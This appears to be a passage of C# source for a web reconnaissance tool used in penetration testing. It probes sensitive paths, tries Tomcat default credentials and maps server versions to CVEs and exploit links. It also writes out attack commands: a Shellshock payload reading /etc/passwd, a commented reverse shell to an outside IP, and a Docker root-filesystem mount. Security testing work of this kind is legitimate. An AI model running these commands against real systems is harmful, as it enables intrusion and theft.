using Pastel;
using System;
using System.Collections.Generic;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Net;
using System.Net.Http;
using System.Net.Http.Headers;
using System.Security.Cryptography;
using System.Security.Cryptography.X509Certificates;
using System.Text.Json;
using System.Text.RegularExpressions;
using System.Threading.Tasks;

namespace Reecon
{
    class Web
    {
        static string scanURL = "";
        public static void GetInfo(string[] args)
        {
            if (args.Length != 2)
            {
                Console.WriteLine("Web Usage: reecon -web http://site.com/");
                return;
            }
            scanURL = args[1];
            if (!scanURL.StartsWith("http"))
            {
                Console.WriteLine("Invalid URL - Must start with http");
                return;
            }

            Console.WriteLine("Scanning...");

            var httpInfo = Web.GetHTTPInfo(scanURL);
            string pageText = httpInfo.PageText;
            string pageInfo = FindInfo(pageText);
            if (pageInfo.Trim() != "")
            {
                Console.WriteLine(pageInfo);
            }
            Console.WriteLine(FormatHTTPInfo(httpInfo.StatusCode, httpInfo.PageTitle, httpInfo.PageText, httpInfo.DNS, httpInfo.Headers, httpInfo.SSLCert, httpInfo.URL));

            // Then find common files
            Console.WriteLine("Searching for common files...");

            string commonFiles = FindCommonFiles(scanURL);
            if (commonFiles.Trim() != String.Empty)
            {
                Console.WriteLine(commonFiles);
            }
            Console.WriteLine("Web Info Scan Finished");
        }

        public static void ScanPage(string url)
        {

        }

        public static string FindInfo(string pageText, bool doubleDash = false)
        {
            string foundInfo = "";
            foundInfo += FindFormData(pageText);
            foundInfo += FindEmails(pageText, doubleDash);
            foundInfo += FindLinks(pageText, doubleDash);
            return foundInfo.Trim(Environment.NewLine.ToCharArray());
        }

        private static string FindFormData(string text)
        {
            // This is very hacky and will probably break
            // I can't just use the WebBrowser control since it's not cross-platform on devices with no GUI
            string returnText = "";
            if (text.Contains("<form"))
            {
                text = text.Remove(0, text.IndexOf("<form"));
                if (text.Contains("</form>"))
                {
                    returnText += "- Form Found" + Environment.NewLine;
                    text = text.Substring(0, text.IndexOf("</form>"));
                    List<string> formData = text.Split(Environment.NewLine.ToCharArray()).ToList();
                    foreach (string line in formData)
                    {
                        if (line.Trim().StartsWith("<form"))
                        {
                            string formHeader = line.Trim();
                            if (formHeader.Contains("action=\""))
                            {
                                string formAction = formHeader.Remove(0, formHeader.IndexOf("action=\"") + 8);
                                formAction = formAction.Substring(0, formAction.IndexOf("\""));
                                returnText += "-- Form Action: " + formAction + Environment.NewLine;
                            }
                            if (formHeader.Contains("method=\""))
                            {
                                string formMethod = formHeader.Remove(0, formHeader.IndexOf("method=\"") + 8);
                                formMethod = formMethod.Substring(0, formMethod.IndexOf("\""));
                                returnText += "-- Form Method: " + formMethod + Environment.NewLine;
                            }
                        }

                        // Bugs out if the input tag is spread over multiple lines
                        if (line.Trim().StartsWith("<input"))
                        {
                            string inputName = "";
                            string inputValue = "";
                            string inputLine = line.Trim(); ;
                            if (inputLine.Contains("name=\""))
                            {
                                inputName = inputLine.Remove(0, inputLine.IndexOf("name=\"") + 6);
                                inputName = inputName.Substring(0, inputName.IndexOf("\""));
                            }
                            if (inputLine.Contains("value=\""))
                            {
                                inputValue = inputLine.Remove(0, inputLine.IndexOf("value=\"") + 6);
                                inputValue = inputValue.Substring(0, inputValue.IndexOf("\""));
                            }
                            if (inputName != "")
                            {
                                returnText += "-- Input -> Name: " + inputName + (inputValue != "" ? ", Value: " + inputValue : "") + Environment.NewLine;
                            }
                        }

                        if (line.Trim().StartsWith("<button"))
                        {
                            returnText += "-- Button: " + line.Trim() + Environment.NewLine;
                        }
                    }
                }
            }
            return returnText;
        }

        private static string FindEmails(string text, bool doubleDash)
        {
            string returnInfo = "";

            // Do not change this Regex
            Regex emailRegex = new(@"\b[A-Z0-9._%+-]+@[A-Z0-9.-]+\.[A-Z]{2,}\b", RegexOptions.IgnoreCase);
            MatchCollection emailMatches = emailRegex.Matches(text);
            List<string> matchList = General.MatchCollectionToList(emailMatches);
            foreach (string match in matchList)
            {
                if (doubleDash)
                {
                    returnInfo += "-- EMail: " + match + Environment.NewLine;
                }
                else
                {
                    returnInfo += "- EMail: " + match + Environment.NewLine;
                }
            }
            return returnInfo;
        }

        private static string FindLinks(string pageText, bool doubleDash)
        {
            List<string> linkList = new List<string>();
            // Find all matches
            MatchCollection m1 = Regex.Matches(pageText, @"(<a.*?>.*?</a>)", RegexOptions.Singleline);

            // Loop over each match.
            foreach (Match m in m1)
            {
                string value = m.Groups[1].Value;
                string href = "";

                // Get href attribute.
                Match m2 = Regex.Match(value, @"href=\""(.*?)\""", RegexOptions.Singleline);
                if (m2.Success)
                {
                    href = m2.Groups[1].Value;
                }

                // Remove inner tags from text.
                string text = Regex.Replace(value, @"\s*<.*?>\s*", "", RegexOptions.Singleline);

                if (href.StartsWith("/"))
                {
                    if (scanURL.EndsWith("/"))
                    {
                        href = scanURL + href.TrimStart('/');
                    }
                }
                if (href.Length > 1 && !href.StartsWith("#")) // Section - Not actual URL
                {
                    if (doubleDash)
                    {
                        string info = "-- " + text + ": " + href;
                        if (!linkList.Contains(info))
                        {
                            linkList.Add(info);
                        }
                    }
                    else
                    {
                        string info = "- " + text + ": " + href;
                        if (!linkList.Contains(info))
                        {
                            linkList.Add(info);
                        }
                    }
                }
            }
            // Convert to a nice string to return
            string returnInfo = "";
            foreach (string item in linkList)
            {
                returnInfo += item + Environment.NewLine;
            }
            return returnInfo.Trim(Environment.NewLine.ToCharArray());
        }

        public static string FindCommonFiles(string url)
        {
            string returnText = "";

            if (!url.EndsWith("/"))
            {
                url += "/";
            }

            // Wildcard test
            int notFoundLength = -1;
            int ignoreFileLength = -1;
            int ignoreFolderLength = -1;
            string wildcardURL = url + "be0df04b-f5ff-4b4f-af99-00968cf08fed";
            bool ignoreRedirect = false;
            bool ignoreForbidden = false;
            bool ignoreBadRequest = false;

            // Testing Wildcards
            var pageResult = Web.GetHTTPInfo(wildcardURL);
            string pageResultText = pageResult.PageText;
            if (pageResult.StatusCode == HttpStatusCode.OK)
            {
                ignoreFileLength = pageResultText.Length;
                returnText += $"- Wildcard paths such as {wildcardURL} return - This may cause issues..." + Environment.NewLine;
            }
            else if (pageResult.StatusCode == HttpStatusCode.Redirect || pageResult.StatusCode == HttpStatusCode.Moved)
            {
                ignoreRedirect = true;
                returnText += $"- Wildcard paths such as {wildcardURL} redirect - This may cause issues..." + Environment.NewLine;
            }
            else if (pageResult.StatusCode == HttpStatusCode.Forbidden)
            {
                ignoreForbidden = true;
                returnText += $"- Wildcard paths such as {wildcardURL} are forbidden - This may cause issues..." + Environment.NewLine;
            }
            else if (pageResult.StatusCode == HttpStatusCode.BadRequest)
            {
                ignoreBadRequest = true;
                returnText += $"- Wildcard paths such as {wildcardURL} return a bad request - This may cause issues..." + Environment.NewLine;
            }
            else if (pageResult.StatusCode == HttpStatusCode.NotFound)
            {
                notFoundLength = pageResultText.Length;
            }

            // PHP wildcards can be differnt
            bool ignorePHP = false;
            bool ignorePHPRedirect = false;
            string phpWildcardURL = url + "be0df04b-f5ff-4b4f-af99-00968cf08fed.php";
            pageResult = Web.GetHTTPInfo(phpWildcardURL);
            pageResultText = pageResult.PageText;
            if (pageResult.StatusCode == HttpStatusCode.OK)
            {
                ignorePHP = true;
                returnText += $"- .php wildcard paths such as {phpWildcardURL} return - This may cause issues..." + Environment.NewLine;
            }
            else if (pageResult.StatusCode == HttpStatusCode.Redirect || pageResult.StatusCode == HttpStatusCode.Moved)
            {
                ignorePHPRedirect = true;
                returnText += $"- .php wildcard paths such as {phpWildcardURL} redirect - This may cause issues..." + Environment.NewLine;
            }
            else if (pageResult.StatusCode == HttpStatusCode.NotFound)
            {
                notFoundLength = pageResultText.Length;
            }

            // Folder wildcards can also be different
            var folderWildcard = Web.GetHTTPInfo(url + "be0df04b-f5ff-4b4f-af99-00968cf08fed/");
            if (folderWildcard.StatusCode == HttpStatusCode.OK)
            {
                ignoreFolderLength = folderWildcard.PageText.Length;
            }

            // Mini gobuster :p
            List<string> commonFiles = new()
            {
                // robots.txt - Of course
                "robots.txt",
                // Most likely invalid folder for test purposes
                "woof/",
                // Common hidden folders
                "hidden/",
                "secret/",
                "backup/",
                "backups/",
                "dev/",
                // Common Index files
                "index.php",
                "index.html",
                "index.jsp",
                // Common images folder
                "images/",
                // Hidden mail server
                "mail/",
                // Admin stuff
                "admin.php",
                "admin/",
                "manager/",
                // Git repo
                ".git/HEAD",
                // SSH
                ".ssh/id_rsa",
                // Bash History
                ".bash_history",
                // NodeJS Environment File
                ".env",
                // General info file
                ".DS_STORE",
                // Wordpress stuff
                "blog/",
                "wordpress/",
                "wordpress/wp-config.php.bak",
                "wp-config.php",
                "wp-config.php.bak",
                // phpmyadmin
                "phpmyadmin/",
                "phpMyAdmin", // Some are case sensitive
                // Kibana
                "app/kibana",
                // Bolt CMS
                "bolt-public/img/bolt-logo.png",
                // Shellshock
                "cgi-bin/", 
                // Well-Known
                ".well-known/", // https://www.google.com/.well-known/security.txt
                // Docker
                "version",
                // PHP stuff
                "vendor/"
            };

            if (ignorePHP)
            {
                commonFiles.RemoveAll(x => x.EndsWith(".php"));
            }
            foreach (string file in commonFiles)
            {
                // Console.WriteLine("In Enum: " + file);
                string path = url + file;
                var response = Web.GetHTTPInfo(path);
                if (response.StatusCode == HttpStatusCode.OK)
                {
                    // Since it's readable - Let's deal with it!
                    try
                    {
                        string pageText = response.PageText;
                        // Ack
                        if (pageText.Length != notFoundLength && // Index files?
                            pageText.Length != ignoreFileLength &&
                            (!file.EndsWith("/") || (pageText.Length != ignoreFolderLength)))
                        {
                            returnText += "- " + $"Common Path is readable: {url}{file} (Len: {pageText.Length})".Pastel(Color.Orange) + Environment.NewLine;
                            // Specific case for robots.txt since it's common and extra useful
                            if (file == "robots.txt")
                            {
                                foreach (var line in pageText.Split(Environment.NewLine.ToCharArray()))
                                {
                                    if (line != "")
                                    {
                                        returnText += "-- " + line + Environment.NewLine;
                                    }
                                }
                            }
                            // Bolt
                            else if (file == "bolt-public/img/bolt-logo.png")
                            {
                                returnText += "-- Bolt CMS!".Pastel(Color.Orange) + Environment.NewLine;
                                returnText += $"-- Admin Page: {url}bolt" + Environment.NewLine;
                                returnText += "-- If you get details and the version is 3.6.* or 3.7: https://www.rapid7.com/db/modules/exploit/unix/webapp/bolt_authenticated_rce OR https://github.com/r3m0t3nu11/Boltcms-Auth-rce-py/blob/master/exploit.py (3.7.0)" + Environment.NewLine;
                            }
                            // Docker Engine
                            else if (file == "version" && pageText.Contains("Docker Engine - Community"))
                            {
                                // Port 2375
                                returnText += "-- Docker Engine Found!".Pastel(Color.Orange) + Environment.NewLine;
                                string dockerURL = url.Replace("https://", "tcp://").Replace("http://", "tcp://").Trim('/');
                                returnText += $"--- List running Dockers: docker -H {dockerURL} ps" + Environment.NewLine;
                                returnText += $"--- List Docker Images: docker -H {dockerURL} images" + Environment.NewLine;
                                returnText += $"--- Mount Root FS: docker -H {dockerURL} run -it -v /:/woof imageName:ver bash" + Environment.NewLine;
                            }
                            // Git repo!
                            else if (file == ".git/HEAD")
                            {
                                returnText += "-- Git repo found!" + Environment.NewLine;

                                // https://github.com/arthaud/git-dumper/issues/9
                                try
                                {
                                    if (General.DownloadString($"{url}.git/").Contains("../"))
                                    {
                                        // -q: Quiet (So the console doesn't get spammed)
                                        // -r: Download everything
                                        // -np: But don't go all the way backwards
                                        // -nH: So you only have the ".git" folder and not the IP folder as well
                                        returnText += $"--- Download the repo: wget -q -r -np -nH {url}.git/" + Environment.NewLine;
                                        returnText += "--- Get the logs: git log --pretty=format:\"%h - %an (%ae): %s %b\"" + Environment.NewLine;
                                        // git log --pretty=format:"%h - %an (%ae): %s %b"
                                        // db.sqlite3
                                        returnText += "--- Show a specific commit: git show 2eb93ac (Press q to close)" + Environment.NewLine;
                                        // https://stackoverflow.com/questions/34751837/git-can-we-recover-deleted-commits
                                        returnText += "--- Find deleted commits: git reflog" + Environment.NewLine;

                                        continue;
                                    }
                                }
                                catch { }
                                returnText += "--- Download: https://raw.githubusercontent.com/arthaud/git-dumper/master/git_dumper.py" + Environment.NewLine;
                                returnText += $"--- Run: python3 git_dumper.py {url}{file} .git" + Environment.NewLine;
                                returnText += "--- Get the logs: git log --pretty=format:\"%h - %an (%ae): %s %b\"" + Environment.NewLine;
                                returnText += "--- Show a specific commit: git show 2eb93ac (Press q to close)" + Environment.NewLine;
                            }
                            // Kibana!
                            else if (file == "app/kibana")
                            {
                                returnText += "-- Kibana!" + Environment.NewLine;
                                try
                                {
                                    string toCheck = $"{url}{file}";
                                    string pageData = General.DownloadString($"{url}{file}");
                                    if (pageData.IndexOf("&quot;version&quot;:&quot;") != -1)
                                    {
                                        string versionText = pageData.Remove(0, pageData.IndexOf("&quot;version&quot;:&quot;") + 26);
                                        versionText = versionText.Substring(0, versionText.IndexOf("&quot;"));
                                        returnText += "--- Version: " + versionText + Environment.NewLine;
                                        returnText += "---- Kibana versions before 5.6.15 and 6.6.1 -> CVE-2019-7609 -> https://github.com/mpgn/CVE-2019-7609" + Environment.NewLine;
                                    }
                                    else
                                    {
                                        returnText += $"--- Version: {url}{file}#/management/" + Environment.NewLine;
                                    }
                                }
                                catch
                                {
                                    returnText += $"--- Version: {url}{file}#/management/" + Environment.NewLine;
                                }
                                returnText += $"--- Elasticsearch Console: {url}{file}#/dev_tools/console" + Environment.NewLine;
                                returnText += "---- General Info: GET /" + Environment.NewLine;
                                returnText += "---- Get Indices: GET /_cat/indices?v" + Environment.NewLine;
                                // These aren't meant to be params
                                returnText += "---- Get Index Info: GET /{index}/_search/?pretty&size={docs.count}" + Environment.NewLine;
                            }
                            // Shellshock
                            else if (file == "cgi-bin/")
                            {
                                // curl -H "user-agent: () { :; }; echo; echo; /bin/bash -c 'cat /etc/passwd'" http://path/cgi-bin/valid.cgi
                                returnText += "-- Possible Shellshock - Search for valid files inside here" + Environment.NewLine;
                                returnText += "--- // Test: curl -H 'User-Agent: () { :;}; echo; /bin/cat /etc/passwd;' http://1.2.3.4/cgi-bin/valid.cgi" + Environment.NewLine;
                                // Shell: curl -H "User-Agent: () { :;}; echo; /bin/bash -i >& /dev/tcp/10.6.2.249/9001 0>&1;" http://10.10.175.194/cgi-bin/valid.cgi"
                            }
                            else
                            {
                                if (response.PageTitle.StartsWith("Index of /"))
                                {
                                    returnText += "-- " + "Open directory listing".Pastel(Color.Orange) + Environment.NewLine;
                                }
                                else
                                {
                                    string usefulInfo = Web.FindInfo(pageText, true);
                                    if (usefulInfo.Trim(Environment.NewLine.ToCharArray()) != "")
                                    {
                                        returnText += usefulInfo + Environment.NewLine;
                                    }
                                }
                            }
                        }

                    }
                    catch (Exception ex)
                    {
                        Console.WriteLine("Bug Reelix - HTTP.FindCommonFiles Error: " + ex.Message + Environment.NewLine);
                    }
                }
                else if (response.StatusCode == HttpStatusCode.BadRequest)
                {
                    // Bad Request is still useful - Unless we're ignoring it
                    if (!ignoreBadRequest)
                    {
                        returnText += $"- Common Path is a Bad Request: {url}{file}" + Environment.NewLine;
                    }
                }
                else if (response.StatusCode == HttpStatusCode.Forbidden)
                {
                    // Forbidden is still useful - Unless we're ignoring it
                    if (!ignoreForbidden)
                    {
                        returnText += $"- Common Path is Forbidden: {url}{file}" + Environment.NewLine;
                    }
                }
                else if (response.StatusCode == HttpStatusCode.Redirect || response.StatusCode == HttpStatusCode.Moved)
                {
                    if (ignoreRedirect)
                    {
                        continue;
                    }
                    if (file.EndsWith(".php") && ignorePHPRedirect)
                    {
                        continue;
                    }
                    returnText += $"- Common Path redirects: {url}{file}" + Environment.NewLine;
                    if (response.Headers != null && response.Headers.Location != null)
                    {
                        returnText += $"-- Redirection Location: {response.Headers.Location}" + Environment.NewLine;
                    }
                }
                else if (response.StatusCode == HttpStatusCode.Unauthorized)
                {
                    returnText += $"- Common path requires authentication: {url}{file}" + Environment.NewLine;
                    var headers = response.Headers;
                    if (headers.Contains("WWW-Authenticate"))
                    {
                        returnText += $"-- WWW-Authenticate: {headers.GetValues("WWW-Authenticate").First()}" + Environment.NewLine;
                    }
                }
                else if (response.StatusCode != HttpStatusCode.NotFound && response.StatusCode != HttpStatusCode.TooManyRequests)
                {
                    if (response.PageText != "")
                    {
                        returnText += $"-- Page Text: {response.PageText}" + Environment.NewLine;
                    }
                }
                else if (response.StatusCode == 0)
                {
                    returnText += $"- " + "Host timed out - Unable to enumerate".Pastel(Color.Red);
                    break;
                }
                else if (response.StatusCode == HttpStatusCode.InternalServerError)
                {
                    returnText += $"- Common path throws an Internal Server Error: {url}{file}" + Environment.NewLine;
                }
                else if (response.StatusCode == HttpStatusCode.TemporaryRedirect)
                {
                    // Normally just http -> https
                    var headers = response.Headers;
                    if (url.StartsWith("http") && headers.Contains("Location") && (headers.Location.ToString().StartsWith("https")))
                    {
                        continue;
                    }
                    else
                    {
                        // If it's not - Display it
                        Console.WriteLine($"-- Weird TemporaryRedirect: {url}{file}" + Environment.NewLine);
                    }
                }
                else if (response.StatusCode == HttpStatusCode.NotFound && response.Headers.Contains("Docker-Distribution-Api-Version"))
                {
                    string dockerVersion = response.Headers.GetValues("Docker-Distribution-Api-Version").First();
                    returnText += "-- Docker Detected - API Version: " + dockerVersion + Environment.NewLine;
                    if (dockerVersion == "registry/2.0")
                    {
                        string repoText = General.DownloadString($"{url}v2/_catalog");
                        if (repoText.Contains("repositories"))
                        {
                            try
                            {
                                var repoList = JsonDocument.Parse(repoText);
                                foreach (var item in repoList.RootElement.GetProperty("repositories").EnumerateArray())
                                {
                                    returnText += "--- Repo Found: " + item + Environment.NewLine;
                                    string tagList = General.DownloadString($"{url}v2/" + item + "/tags/list");
                                    tagList = tagList.Replace("\r", "").Replace("\n", ""); // Sometimes has a built in newline for some reason
                                    returnText += "---- Tags Found: " + tagList + Environment.NewLine;
                                    // /v2/cmnatic/myapp1/tags/list
                                    // --> /cmnatic/myapp1/manifests/notsecure
                                }
                                returnText += $"------> {url}v2/[repoName]/app/manifests/[tagName]";
                                // Every notfound will be the same
                                break;
                            }
                            catch
                            {
                                returnText += "--- Unable to deserialize repo - Bug Reelix!" + Environment.NewLine;
                                break;
                            }
                        }
                        returnText += repoText;
                    }
                    else
                    {
                        returnText += "-- Unknown Docker API Version - Bug Reelix!";
                    }
                }
                // We ignore basic 404's and 503's since they're not useful
                else if (response.StatusCode != HttpStatusCode.NotFound && response.StatusCode != HttpStatusCode.ServiceUnavailable)
                {
                    Console.WriteLine($"Unknown response for {file} - {response.StatusCode}");
                }
            }
            return returnText.Trim(Environment.NewLine.ToArray());
        }

        public static (HttpStatusCode StatusCode, string PageTitle, string PageText, string DNS, HttpResponseHeaders Headers, X509Certificate2 SSLCert, string URL, string AdditionalInfo) GetHTTPInfo(string url, string userAgent = null)
        {
            string pageTitle = "";
            string pageText = "";
            string dns = "";
            HttpStatusCode statusCode = new();
            HttpResponseHeaders headers = null;
            X509Certificate2 cert = null;

            // Ignore invalid SSL Cert
            var httpClientHandler = new HttpClientHandler();
            httpClientHandler.ServerCertificateCustomValidationCallback += (sender, certificate, chain, sslPolicyErrors) =>
            {
                if (certificate != null)
                {
                    cert = new X509Certificate2(certificate);
                }
                return true;
            };
            httpClientHandler.AllowAutoRedirect = false;

            HttpClient httpClient = new HttpClient(httpClientHandler);
            Uri theURL = new Uri(url);
            HttpRequestMessage httpClientRequest = new HttpRequestMessage(HttpMethod.Get, theURL);
            if (userAgent != null)
            {
                httpClientRequest.Headers.UserAgent.TryParseAdd(userAgent);
            }
            try
            {
                httpClient.Timeout = TimeSpan.FromMilliseconds(5000);
                HttpResponseMessage httpClientResponse = httpClient.Send(httpClientRequest);
                statusCode = httpClientResponse.StatusCode;
                dns = theURL.DnsSafeHost;
                headers = httpClientResponse.Headers;
                using (StreamReader readStream = new(httpClientResponse.Content.ReadAsStream()))
                {
                    pageText = readStream.ReadToEnd();
                }
            }
            catch (TimeoutException ex)
            {
                Console.WriteLine("HttpClient Timeout Error: " + ex.Message);
            }
            catch (WebException wex)
            {
                Console.WriteLine("Here: " + wex.Message);
            }
            catch (Exception ex)
            {
                if (ex.Message.StartsWith("The SSL connection could not be established, see inner exception"))
                {
                    // Not valid
                    return (statusCode, null, null, null, null, null, null, null);
                }
                else if (ex.Message.StartsWith("The request was canceled due to the configured HttpClient.Timeout of "))
                {
                    // Why is this not caught in the TimeoutException...
                    return (statusCode, null, null, null, null, null, url, "Timeout");
                }
                else
                {
                    Console.WriteLine("HttpClient rewrite had an error: " + ex.Message + ex.InnerException);
                }
            }
            if (pageText.Contains("<title>") && pageText.Contains("</title>"))
            {
                pageTitle = pageText.Remove(0, pageText.IndexOf("<title>") + "<title>".Length);
                pageTitle = pageTitle.Substring(0, pageTitle.IndexOf("</title>"));
            }
            return (statusCode, pageTitle, pageText, dns, headers, cert, url, null);
        }

        public static string FormatHTTPInfo(HttpStatusCode StatusCode, string PageTitle, string PageText, string DNS, HttpResponseHeaders Headers, X509Certificate2 SSLCert, string URL)
        {
            string urlPrefix = URL.StartsWith("https") ? "https" : "http";
            string responseText = "";
            if (StatusCode != HttpStatusCode.OK)
            {
                // There's a low chance that it will return a StatusCode that is not in the HttpStatusCode list in which case (int)StatusCode will crash
                if (StatusCode == HttpStatusCode.MovedPermanently)
                {
                    if (Headers != null && Headers.Location != null)
                    {
                        responseText += "- Moved Permanently" + Environment.NewLine;
                        responseText += "-> Location: " + Headers.Location + Environment.NewLine;
                        Headers.Remove("Location");
                    }
                }
                else if (StatusCode == HttpStatusCode.Redirect)
                {
                    if (Headers != null && Headers.Location != null)
                    {
                        responseText += "- Redirect" + Environment.NewLine;
                        responseText += "-> Location: " + Headers.Location + Environment.NewLine;
                        Headers.Remove("Location");
                    }
                }
                else if (StatusCode == HttpStatusCode.NotFound)
                {
                    responseText += "- Base page is a 404" + Environment.NewLine;
                }
                else if (StatusCode != HttpStatusCode.OK)
                {
                    try
                    {
                        responseText += "- Weird Status Code: " + (int)StatusCode + " " + StatusCode + Environment.NewLine;
                    }
                    catch
                    {
                        responseText += "- Fatally Unknown Status Code: " + " " + StatusCode + Environment.NewLine;
                    }
                    if (Headers != null && Headers.Location != null)
                    {
                        responseText += "-> Location: " + Headers.Location + Environment.NewLine;
                        Headers.Remove("Location");
                    }
                }
            }
            // Page Title
            if (!string.IsNullOrEmpty(PageTitle))
            {
                PageTitle = PageTitle.Trim();
                responseText += "- Page Title: " + PageTitle + Environment.NewLine;
                if (PageTitle.StartsWith("Apache Tomcat"))
                {
                    // Sanitize URL
                    if (!URL.EndsWith("/"))
                    {
                        URL += "/";
                    }

                    // CVE's
                    if (PageTitle == "Apache Tomcat/9.0.17")
                    {
                        responseText += "- " + "Apache Tomcat 9.0.17 Detected - Vulnerable to CVE-2019-0232!".Pastel(Color.Orange);
                    }

                    // Apache Tomcat Page
                    NetworkCredential defaultTomcatCreds = new("tomcat", "s3cret");

                    // Check Manager (Status)
                    string managerStatusURL = URL + "manager/status";
                    var managerStatusInfo = Web.GetHTTPInfo(managerStatusURL);
                    if (managerStatusInfo.StatusCode == HttpStatusCode.Unauthorized)
                    {
                        responseText += "- Manager (Status) Found - But it requires credentials --> " + managerStatusURL + Environment.NewLine;
                        try
                        {
                            General.DownloadString(managerStatusURL, Creds: defaultTomcatCreds);
                            responseText += "-- " + "Creds Found: tomcat:s3cret".Pastel(Color.Orange) + Environment.NewLine;
                        }
                        catch
                        {
                            responseText += "-- Default creds - tomcat:s3cret - don't work" + Environment.NewLine;
                        }
                    }
                    else if (managerStatusInfo.StatusCode == HttpStatusCode.Forbidden)
                    {
                        responseText += "- Manager (Status) Found - But it's Forbidden" + Environment.NewLine;
                    }
                    else if (managerStatusInfo.StatusCode != HttpStatusCode.NotFound)
                    {
                        responseText += "Unknown Manager (Status) Code: " + managerStatusInfo.StatusCode + Environment.NewLine;
                    }

                    // Check Manager (HTML)
                    string managerAppHTMLURL = URL + "manager/html";
                    var managerAppInfo = Web.GetHTTPInfo(managerAppHTMLURL);
                    if (managerAppInfo.StatusCode == HttpStatusCode.Unauthorized)
                    {
                        responseText += "- Manager App (HTML) Found - But it requires credentials --> " + managerAppHTMLURL + Environment.NewLine;
                        try
                        {
                            General.DownloadString(managerAppHTMLURL, Creds: defaultTomcatCreds);
                            responseText += "-- " + "Creds Found: tomcat:s3cret".Pastel(Color.Orange) + Environment.NewLine;
                        }
                        catch
                        {
                            responseText += "-- Default creds - tomcat:s3cret - don't work" + Environment.NewLine;
                        }
                    }
                    else if (managerAppInfo.StatusCode == HttpStatusCode.Forbidden)
                    {
                        responseText += "- Manager App Found - But it's Forbidden" + Environment.NewLine;
                    }
                    else if (managerAppInfo.StatusCode != HttpStatusCode.NotFound)
                    {
                        responseText += "Unknown Manager App Status Code: " + managerAppInfo.StatusCode + Environment.NewLine;
                    }

                    // Check Manager (Text)
                    string managerAppTextURL = URL + "manager/text";
                    managerAppInfo = Web.GetHTTPInfo(managerAppTextURL);
                    if (managerAppInfo.StatusCode == HttpStatusCode.Unauthorized)
                    {
                        responseText += "- Manager App (Text) Found - But it requires credentials --> " + managerAppTextURL + Environment.NewLine;
                        try
                        {
                            General.DownloadString(managerAppTextURL, Creds: defaultTomcatCreds);
                            responseText += "-- " + "Creds Found: tomcat:s3cret".Pastel(Color.Orange) + Environment.NewLine;
                        }
                        catch
                        {
                            responseText += "-- Default creds - tomcat:s3cret - don't work" + Environment.NewLine;
                        }
                    }
                    else if (managerAppInfo.StatusCode == HttpStatusCode.Forbidden)
                    {
                        responseText += "- Manager App Found - But it's Forbidden" + Environment.NewLine;
                    }
                    else if (managerAppInfo.StatusCode != HttpStatusCode.NotFound)
                    {
                        responseText += "Unknown Manager App Status Code: " + managerAppInfo.StatusCode + Environment.NewLine;
                    }

                    // Check Host Manager
                    string hostManagerURL = URL + "host-manager/html";
                    var hostManagerInfo = Web.GetHTTPInfo(hostManagerURL);
                    if (hostManagerInfo.StatusCode == HttpStatusCode.Unauthorized)
                    {
                        responseText += "- Host Manager Found - But it requires credentials --> " + hostManagerURL + Environment.NewLine;
                        try
                        {
                            General.DownloadString(hostManagerURL, Creds: defaultTomcatCreds);
                            responseText += "-- " + "Creds Found: tomcat:s3cret".Pastel(Color.Orange) + Environment.NewLine;
                        }
                        catch
                        {
                            responseText += "-- Default creds - tomcat:s3cret - don't work" + Environment.NewLine;
                        }
                    }
                    else if (hostManagerInfo.StatusCode == HttpStatusCode.Forbidden)
                    {
                        responseText += "- Host Manager Found - But it's Forbidden" + Environment.NewLine;
                    }
                    else if (hostManagerInfo.StatusCode != HttpStatusCode.NotFound)
                    {
                        responseText += "Unknown Host Manager Status Code: " + hostManagerInfo.StatusCode + Environment.NewLine;
                    }
                }
            }

            // DNS
            if (!string.IsNullOrEmpty(DNS))
            {
                responseText += "- DNS: " + DNS + Environment.NewLine;
            }

            // Headers!
            if (Headers.Any())
            {
                // Server info
                if (Headers.Any(x => x.Key == "Server"))
                {
                    // Note: {URL} ends with a /
                    string serverText = Headers.Server.ToString();
                    Headers.Remove("Server");
                    // Eg: Apache/2.4.46, (Win64), OpenSSL/1.1.1j, PHP/7.3.27
                    // Heartbleed - OpenSSL 1.0.1 through 1.0.1f (inclusive) are vulnerable
                    responseText += "- Server: " + serverText + Environment.NewLine;
                    if (serverText.StartsWith("Apache"))
                    {
                        responseText += "-- " + "Apache Detected".Pastel(Color.Orange) + Environment.NewLine;
                        if (serverText.Contains("2.4.49") || serverText.Contains("2.4.50"))
                        {
                            responseText += "--- " + "Version possible vulnerable to CVE-2021-41773 or CVE-2021-42013" + Environment.NewLine;
                            // TODO: Add better sources
                        }
                    }
                    else if (serverText.StartsWith("MiniServ/"))
                    {
                        responseText += "-- " + "Webmin Server Detected".Pastel(Color.Orange) + Environment.NewLine;
                        if (serverText == "MiniServ/1.580")
                        {
                            responseText += "--- " + "Version Likely vulnerable to CVE-2012-2982!!".Pastel(Color.Orange) + Environment.NewLine;
                            responseText += "---- https://www.exploit-db.com/exploits/21851 (Metasploit)" + Environment.NewLine;
                            responseText += "---- OR https://raw.githubusercontent.com/cd6629/CVE-2012-2982-Python-PoC/master/web.py" + Environment.NewLine;
                        }
                        // 1.890, 1.900-1.920 - http://www.webmin.com/changes.html
                        else if (serverText.StartsWith("MiniServ/1.890") || serverText.StartsWith("MiniServ/1.900") || serverText.StartsWith("MiniServ/1.910") || serverText.StartsWith("MiniServ/1.920"))
                        {
                            responseText += "--- " + "Version Likely vulnerable to CVE-2019-15107!!".Pastel(Color.Orange) + Environment.NewLine;
                            responseText += "---- git clone https://github.com/MuirlandOracle/CVE-2019-15107 OR https://github.com/rapid7/metasploit-framework/blob/master/modules/exploits/linux/http/webmin_backdoor.rb" + Environment.NewLine;
                        }
                    }
                    else if (serverText.StartsWith("Werkzeug/"))
                    {
                        responseText += "-- " + "Werkzeug Detected" + Environment.NewLine;
                        var consolePage = GetHTTPInfo($"{URL}console");
                        if (consolePage.StatusCode != HttpStatusCode.NotFound)
                        {
                            if (consolePage.PageText.Contains("The console is locked and needs to be unlocked by entering the PIN."))
                            {
                                responseText += "--- /console exists - But it needs a PIN" + Environment.NewLine;
                                responseText += "--- If you get LFI - https://book.hacktricks.xyz/pentesting/pentesting-web/werkzeug" + Environment.NewLine;
                            }
                            else
                            {
                                responseText += "--- /console exists - With no PIN!".Pastel(Color.Orange) + Environment.NewLine; ;
                            }
                        }
                        else
                        {
                            responseText += "--- No /console :(" + Environment.NewLine;
                        }
                    }
                    else if (serverText.StartsWith("HFS"))
                    {
                        responseText += "-- HTTP File Server (HFS) Detected!" + Environment.NewLine;
                        if (serverText.Contains("HFS 2.3"))
                        {
                            responseText += "--- " + "Version likely vulnerable to CVE-2014-6287 - https://www.exploit-db.com/raw/49584".Pastel(Color.Orange) + Environment.NewLine;
                        }
                    }
